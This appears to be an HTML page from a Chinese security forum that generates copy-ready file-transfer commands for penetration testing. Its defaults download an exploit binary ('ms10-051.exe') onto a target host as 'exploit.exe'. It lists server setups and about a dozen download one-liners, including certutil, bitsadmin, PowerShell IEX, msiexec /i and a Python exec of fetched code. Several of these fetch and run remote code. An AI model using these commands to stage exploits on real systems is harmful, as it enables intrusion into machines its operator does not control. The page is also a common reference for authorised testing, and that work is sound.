@@ -1,0 +1,274 @@
+<html>
+<head>
+<title>File-Download-Generator - 文件下载命令快捷生成</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<style type="text/css">
+#wrap {
+    padding-bottom: 10px;
+    min-height: 450px;
+    border: 5px solid #333333;
+    background-color: #FFF;
+    clear: both;
+    width: 95%;
+    margin: 0 auto;
+}
+</style>
+</head>
+<body>  
+
+
+<div id="wrap" class="wrap s_clear">
+    <div class="main">
+        <div class="content">
+            <script type="text/javascript">
+            var currentMenu = $('mn_') ? $('mn_') : $('mn_index');
+            currentMenu.parentNode.className = 'current';
+            </script>
+            </script>
+            <div class="s_clear">
+                <div class="ywhacknav"></div>
+                <script>
+                    function disableScrolling(){
+    var x=window.scrollX;
+    var y=window.scrollY;
+    window.onscroll=function(){window.scrollTo(x, y);};
+}
+
+function enableScrolling(){
+    window.onscroll=function(){};
+}
+
+function copy(item_id) {
+  disableScrolling();
+  var copyText = document.getElementById(item_id).textContent;
+  const textArea = document.getElementById('txt');
+  textArea.textContent = copyText;
+  textArea.select();
+  document.execCommand("copy");
+  enableScrolling();
+  return false;
+}
+</script>
+                <style type="text/css">
+                    html {
+    margin: 0;
+    padding: 0;
+    height: 100%
+}
+
+body {
+    background: #f4f4f4;
+    font: 12px "Lucida Grande", "Lucida Sans Unicode", Helvetica, Arial, Verdana, sans-serif;
+    font-size: 12px;
+    margin: 0;
+    padding: 0;
+    height: 100%
+}
+
+                button {
+
+                    padding: 0 5px;
+                    margin: 0;
+                }
+
+                textarea {
+                    position: fixed;
+                    left: -100%;
+                }
+
+                pre {
+                    font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, monospace;
+                    font-size: 12px;
+                    background-color: #f6f8fa;
+                    overflow: auto;
+                    border: 1px solid #898989;
+                    padding: 5px;
+                }
+
+                .main_shell {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                    padding: 15px;
+                    border: 1px solid #898989;
+                }
+
+                .main_shell h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+                .main_bountytips {
+                    max-width: 100%;
+                    margin: auto;
+                    background-color: #fff;
+                }
+
+                .main_bountytips h3 {
+                    padding-top: 15px;
+                    font-size: 16px;
+                }
+
+
+                .tips {
+                    padding-bottom: 15px;
+                    padding-top: 10px;
+                    border-bottom: 1px dashed #999;
+
+                }
+
+                .tips ul {
+                    display: block;
+                    list-style-type: disc;
+                    margin-block-start: 1em;
+                    margin-block-end: 1em;
+                    margin-inline-start: 0px;
+                    margin-inline-end: 0px;
+                    padding-inline-start: 15px;
+                }
+
+                .tips ul li {
+                    display: list-item;
+                    text-align: -webkit-match-parent;
+                    list-style-type: square;
+                }
+
+                .tips .tips_title {
+                    font-size: 14px;
+                    padding-bottom: 10px;
+                }
+
+                .tips blockquote {
+                    padding: 0 15px;
+                    margin: 0;
+                    color: #666;
+                    border-left: 4px solid #ddd;
+                }
+
+                input[type=text] {
+                    border: 1px solid #898989;
+                    font-size: 12px;
+                    width: 140px;
+                }
+                </style>
+                
+               <div class="itemtitle s_clear">
+                <h1 style="padding-left: 15px;">BountyTips - 文件下载命令生成</h1>
+            </div>
+                <div class="main_shell">
+                    IP: <input type="text" id="ip" value="127.0.0.1" name="ip">
+                    Port: <input type="text" id="port" value="8080" name="port">
+                    Source File: <input type="text" id="Source" value="ms10-051.exe" name="Source">
+                    Destination File: <input type="text" id="name" value="exploit.exe" name="name">
+                    <input type="submit" value="Change" onclick="myFunction()">
+                    <input type="reset" value="Reset" onclick="myFunction2()">
+                    <script>
+                    function myFunction() {
+                        var ip = document.getElementById("ip").value;
+                        var port = document.getElementById("port").value;
+                        var Source = document.getElementById("Source").value;
+                        var name = document.getElementById("name").value;
+                        console.log(ip);
+                        console.log(port);
+                        console.log(Source);
+                        console.log(name);
+                        var html = document.body.innerHTML;
+                        html = html.replace(/127\.0\.0\.1/g, ip);
+                        html = html.replace(/8080/g, port);
+                        html = html.replace(/ms10-051\.exe/g, Source);
+                        html = html.replace(/exploit\.exe/g, name);
+                        document.body.innerHTML = html;
+                    }
+
+                    function myFunction2() {
+                        location.reload();
+                    }
+                    </script>
+                    <textarea id="txt"></textarea>
+                    <div class="main_bountytips">
+                    <h3>文件下载命令快捷生成:</h3>
+                    <div class="tips">
+                        Python HTTP:
+                        <pre id="cmd001">python -m SimpleHTTPServer 8080</pre>
+                        <button onclick="copy('cmd001')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 HTTP:
+                        <pre id="cmd002">python3 -m http.server 8080</pre>
+                        <button onclick="copy('cmd002')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python FTP:
+                        <pre id="cmd003">python -m pyftpdlib -p 8080</pre>
+                        <button onclick="copy('cmd003')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python3 SMB:
+                        <pre id="cmd004">python3 impacket-smbserver.py files . -port 8080</pre>
+                        <button onclick="copy('cmd004')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IWR:
+                        <pre id="cmd005">powershell.exe -Command "Invoke-WebRequest -Uri http://127.0.0.1:8080/ms10-051.exe -OutFile exploit.exe"</pre>
+                        <button onclick="copy('cmd005')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        PowerShell - IEX:
+                        <pre id="cmd006">powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://127.0.0.1:8080/ms10-051.exe', exploit.exe)"</pre>
+                        <button onclick="copy('cmd006')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - Certutil:
+                        <pre id="cmd007">certutil.exe -urlcache -split -f http://127.0.0.1:8080/ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd007')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        CMD - SMB:
+                        <pre id="cmd008">copy \\127.0.0.1\files\ms10-051.exe exploit.exe</pre>
+                        <button onclick="copy('cmd008')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - wget:
+                        <pre id="cmd009">wget http://127.0.0.1:8080/ms10-051.exe -O exploit.exe</pre>
+                        <button onclick="copy('cmd009')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Linux - curl:
+                        <pre id="cmd010">curl http://127.0.0.1:8080/ms10-051.exe -o exploit.exe</pre>
+                        <button onclick="copy('cmd010')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows Bitsadmin:
+                        <pre id="cmd011">bitsadmin /rawreturn /transfer down "http://127.0.0.1:8080/ms10-051.exe" c:\\exploit.exe</pre>
+                        <button onclick="copy('cmd011')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows msiexec:
+                        <pre id="cmd012">msiexec /q /i http://127.0.0.1:8080/ms10-051.exe</pre>
+                        <button onclick="copy('cmd012')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Python Download:
+                        <pre id="cmd013">python -c "import urllib2; exec urllib2.urlopen('http://127.0.0.1:8080/ms10-051.exe').read();"</pre>
+                        <button onclick="copy('cmd013')">Copy</button>
+                    </div>
+                    <div class="tips">
+                        Windows IPC$:
+                        <pre id="cmd014">copy \127.0.0.1\c$\ms10-051.exe C:\exploit.exe</pre>
+                        <button onclick="copy('cmd014')">Copy</button>
+                    </div>
+                    <div class="tips">
+                    <blockquote>
+                        <p>参考File Download Generator：<a href="https://file-downloads.com/" target="_blank">https://file-downloads.com/</a></p>
+                        <p>From：<a href="https://forum.ywhack.com/" target="_blank">Edge Security Team</a></p>
+                    </blockquote>
+                </div>
+                </div>
+                </div>
+                <br>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
